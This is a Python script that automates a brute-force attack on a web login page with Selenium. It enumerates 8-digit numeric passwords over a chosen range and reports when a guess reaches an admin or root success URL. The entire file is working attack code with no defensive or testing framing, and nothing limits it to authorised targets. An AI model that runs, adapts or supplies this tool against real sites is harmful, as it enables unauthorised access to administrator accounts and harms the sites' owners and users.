from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import itertools

def brute_force_login(driver_path, login_url, success_url, root_url, password_field_selector, login_button_selector, start, end):
    service = Service(driver_path)
    driver = webdriver.Chrome(service=service)
    driver.get(login_url)

    print('Starting brute-force!')

    try:
        WebDriverWait(driver, 2).until(EC.presence_of_element_located((By.CSS_SELECTOR, password_field_selector)))

        # Generate combinations within the given range
        combinations = (''.join(p) for p in itertools.product('0123456789', repeat=8))
        combinations = list(itertools.islice(combinations, start, end))

        count = 0
        for password in combinations:
            if count % 250 == 0:
                print(f'Trying password combination number {count}: {password}')

            password_field = driver.find_element(By.CSS_SELECTOR, password_field_selector)
            login_button = driver.find_element(By.CSS_SELECTOR, login_button_selector)

            password_field.clear()
            password_field.send_keys(password)
            login_button.click()

            try:
                WebDriverWait(driver, 2).until(EC.url_changes(login_url))
                current_url = driver.current_url

                if current_url == success_url:
                    print(f'Login successful with admin password: {password}')
                    break
                elif current_url == root_url:
                    print(f'Login successful with root password: {password}')
                    break
                else:
                    driver.get(login_url)
            except Exception as e:
                pass

            count += 1

    except Exception as e:
        print(f'An error occurred: {e}')
    finally:
        driver.quit()

if __name__ == "__main__":
    # Input parameters
    driver_path = input("Enter the path to the WebDriver: ")
    login_url = input("Enter the login URL: ")
    success_url = input("Enter the success URL: ")
    root_url = input("Enter the root URL: ")
    password_field_selector = input("Enter the password field CSS selector: ")
    login_button_selector = input("Enter the login button CSS selector: ")

    # Set the range for the brute-force attack
    start_index = int(input("Enter the start index: "))
    end_index = int(input("Enter the end index: "))

    brute_force_login(driver_path, login_url, success_url, root_url, password_field_selector, login_button_selector, start_index, end_index)
